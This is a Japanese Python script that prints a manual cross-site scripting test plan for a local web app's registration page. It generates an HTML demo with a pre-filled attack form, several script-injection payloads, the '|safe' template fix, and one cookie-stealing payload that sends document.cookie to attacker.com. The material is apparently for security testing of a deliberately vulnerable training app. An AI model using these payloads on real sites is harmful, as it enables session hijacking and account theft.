#!/usr/bin/env python3
"""
シンプルなXSSテスト（手動実行用）
"""

print("=== 新規登録でのXSS脆弱性の確認 ===")
print()

# 脆弱性の所在を確認
print("🚨 発見された脆弱性:")
print("1. ファイル: app/templates/base.html")
print("2. 行: 128")
print("3. コード: {{ message|safe }}")
print()

print("📍 脆弱性の詳細:")
print("- フラッシュメッセージで |safe フィルターが使用されている")
print("- これによりHTMLエスケープがバイパスされる") 
print("- ユーザー入力がエラーメッセージに直接反映される")
print()

print("💡 XSSペイロード例:")
xss_payloads = [
    "<script>alert('XSS in Registration!')</script>",
    "<img src=x onerror=alert('XSS!')>",
    "<svg onload=alert('XSS!')>",
    "<div onmouseover=alert('XSS!')>マウスオーバー</div>"
]

for i, payload in enumerate(xss_payloads, 1):
    print(f"{i}. {payload}")

print()
print("🔍 テスト手順:")
print("1. http://localhost:8000/register にアクセス")
print("2. ユーザー名にXSSペイロードを入力:")
print("   例: <script>alert('XSS!')</script>")
print("3. 適当なメールアドレスとパスワードを入力")
print("4. 登録ボタンをクリック")
print("5. エラーメッセージまたは成功メッセージでXSSが発火")
print()

print("🎯 攻撃シナリオ:")
print("1. 重複ユーザー名エラーでXSSが発火")
print("2. 既存ユーザー名にXSSペイロードを含めて登録試行")
print("3. エラーメッセージ 'このユーザー名は既に使用されています' でXSS実行")
print()

print("📋 実証用HTMLファイルを作成します...")

# 実証用HTMLファイルを作成
demo_html = '''<!DOCTYPE html>
<html>
<head>
    <title>新規登録XSS実証デモ</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
        .warning { background: #ffebee; color: #c62828; padding: 15px; border-radius: 4px; margin: 20px 0; }
        .payload { background: #f0f0f0; padding: 10px; margin: 10px 0; border-left: 4px solid #2196F3; }
        .test-form { background: #e8f5e8; padding: 20px; border-radius: 4px; margin: 20px 0; }
        .danger { background: #ffcdd2; color: #d32f2f; padding: 10px; border-radius: 4px; }
        button { background: #f44336; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #d32f2f; }
        input[type="text"], input[type="email"], input[type="password"] { 
            width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px; 
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚨 新規登録XSS脆弱性 実証デモ</h1>
        
        <div class="warning">
            <strong>⚠️ 警告:</strong> これは教育目的のセキュリティテストです。悪用は禁止されています。
        </div>
        
        <h2>🔍 脆弱性の詳細</h2>
        <ul>
            <li><strong>ファイル:</strong> app/templates/base.html (line 128)</li>
            <li><strong>コード:</strong> <code>{{ message|safe }}</code></li>
            <li><strong>問題:</strong> フラッシュメッセージでHTMLエスケープが無効化</li>
            <li><strong>影響:</strong> ユーザー入力がHTMLとして直接実行される</li>
        </ul>
        
        <h2>💉 XSSペイロード例</h2>
        <div class="payload">
            <strong>基本アラート:</strong><br>
            <code>&lt;script&gt;alert('XSS Attack!')&lt;/script&gt;</code>
        </div>
        
        <div class="payload">
            <strong>Cookie窃取:</strong><br>
            <code>&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code>
        </div>
        
        <div class="payload">
            <strong>イベントハンドラー:</strong><br>
            <code>&lt;img src=x onerror=alert('XSS!')&gt;</code>
        </div>
        
        <div class="payload">
            <strong>DOM操作:</strong><br>
            <code>&lt;svg onload=document.body.innerHTML='&lt;h1&gt;Hacked!&lt;/h1&gt;'&gt;</code>
        </div>
        
        <h2>🎯 実証テストフォーム</h2>
        <div class="test-form">
            <p><strong>手順:</strong></p>
            <ol>
                <li>下記フォームの「XSS攻撃テスト」ボタンをクリック</li>
                <li>新しいタブで登録画面が開きます</li>
                <li>ユーザー名にXSSペイロードが入力された状態になります</li>
                <li>「登録」ボタンをクリックしてXSSを発火させます</li>
            </ol>
            
            <form action="http://localhost:8000/register" method="POST" target="_blank">
                <h3>📝 テスト用登録フォーム</h3>
                <p>
                    <label>ユーザー名 (XSSペイロード):</label><br>
                    <input type="text" name="username" value="&lt;script&gt;alert('新規登録XSS実証成功!')&lt;/script&gt;" style="width:100%;">
                </p>
                <p>
                    <label>メールアドレス:</label><br>
                    <input type="email" name="email" value="test@example.com">
                </p>
                <p>
                    <label>パスワード:</label><br>
                    <input type="password" name="password" value="password123">
                </p>
                
                <div class="danger">
                    <strong>注意:</strong> このボタンをクリックすると実際にXSS攻撃が実行されます！
                </div>
                <br>
                <button type="submit">🚨 XSS攻撃テスト実行</button>
            </form>
        </div>
        
        <h2>🛡️ 攻撃の流れ</h2>
        <ol>
            <li>攻撃者がXSSペイロード付きユーザー名で登録を試行</li>
            <li>登録処理でエラーが発生（重複ユーザー名等）</li>
            <li>フラッシュメッセージにユーザー入力が含まれる</li>
            <li><code>{{ message|safe }}</code> によりHTMLエスケープがスキップ</li>
            <li>ブラウザがXSSペイロードを実行</li>
        </ol>
        
        <h2>🔧 修正方法</h2>
        <div class="payload">
            <strong>修正前:</strong> <code>{{ message|safe }}</code><br>
            <strong>修正後:</strong> <code>{{ message }}</code> または <code>{{ message|e }}</code>
        </div>
        
        <h2>📖 参考情報</h2>
        <ul>
            <li><a href="https://flask.palletsprojects.com/en/2.0.x/templating/#controlling-autoescaping" target="_blank">Flask テンプレートエスケープ</a></li>
            <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP XSS Prevention</a></li>
            <li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss" target="_blank">MDN XSS Documentation</a></li>
        </ul>
    </div>
</body>
</html>'''

with open('registration_xss_demo.html', 'w', encoding='utf-8') as f:
    f.write(demo_html)

print("✅ registration_xss_demo.html ファイルが作成されました")
print()
print("🌐 ブラウザで開いてテストしてください:")
print("file:///C:/Users/tmakise/Documents/yarare/v1/exploit_server1/exploit_server/registration_xss_demo.html")
print()
print("または、直接以下のURLでテスト:")
print("http://localhost:8000/register")
print()
print("📝 手動テスト用XSSペイロード:")
print("ユーザー名: <script>alert('XSS成功!')</script>")
print("メール: test@example.com") 
print("パスワード: password123")